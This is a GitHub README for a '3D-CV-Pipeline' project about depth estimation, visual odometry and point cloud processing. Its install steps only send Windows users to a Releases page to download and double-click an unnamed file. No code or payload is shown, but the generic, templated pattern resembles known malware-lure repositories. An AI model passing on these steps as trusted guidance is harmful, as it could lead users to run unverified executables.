## üõ†Ô∏è Description

This repository is the culmination of my exploration into advanced 3D computer vision. I built an integrated pipeline capable of transforming 2D images into 3D worlds through depth reconstruction, visual odometry, and comprehensive point cloud processing. This tool is perfect for anyone looking to dive into 3D visualization and learn about computer vision techniques.

- 3D Reconstruction
- Computer Vision
- Depth Estimation
- Learning Journey
- Open3D
- OpenCV
- Point Cloud Processing
- Portfolio Project
- Python
- Stereo Vision
- Visual Odometry

## üöÄ Getting Started

To use this pipeline, follow the steps below. You will find everything you need to download and run the application. 

### üîó Download Link

You can download the application directly from the Releases page:

[Download 3D-CV-Pipeline](https://github.com/lhautboiste/3D-CV-Pipeline/releases)

### üì• System Requirements

- **Operating System:** Windows 10 or later
- **RAM:** 8 GB or more
- **Storage:** 1 GB available space

## üõ†Ô∏è Installation Steps

1. **Visit the Releases Page:**  
   Click on the link below to go to the Releases page:  
   [Visit Releases Page](https://github.com/lhautboiste/3D-CV-Pipeline/releases)

2. **Download the Latest Version:**  
   Look for the latest release version at the top of the page. You will see a list of downloadable files. Click on the file that is appropriate for your system. 

3. **Run the Application:**  
   Once the download is complete, locate the downloaded file on your computer. Double-click it to run the application. Follow any on-screen prompts to complete the setup. 

## üñ•Ô∏è Using the 3D-CV-Pipeline

After successfully installing the application, you can start using it. Here is how to transform your 2D images into 3D models:

1. **Prepare Your Images:**  
   Make sure you have a set of 2D images. For the best results, use images that have overlapping fields of view.

2. **Load Images into the Application:**  
   Open the application and load your images. You will find an option to upload files directly in the interface.

3. **Choose Your Processing Options:**  
   You can select various options for depth estimation and point cloud processing. The default settings are suitable for most users.

4. **Run the Process:**  
   Click the "Process" button to start transforming your images into a 3D model. Depending on your images, this may take a few moments.

5. **View and Save Your Results:**  
   After processing, you will see the 3D model in the application. You can save the result as a file format of your choice.
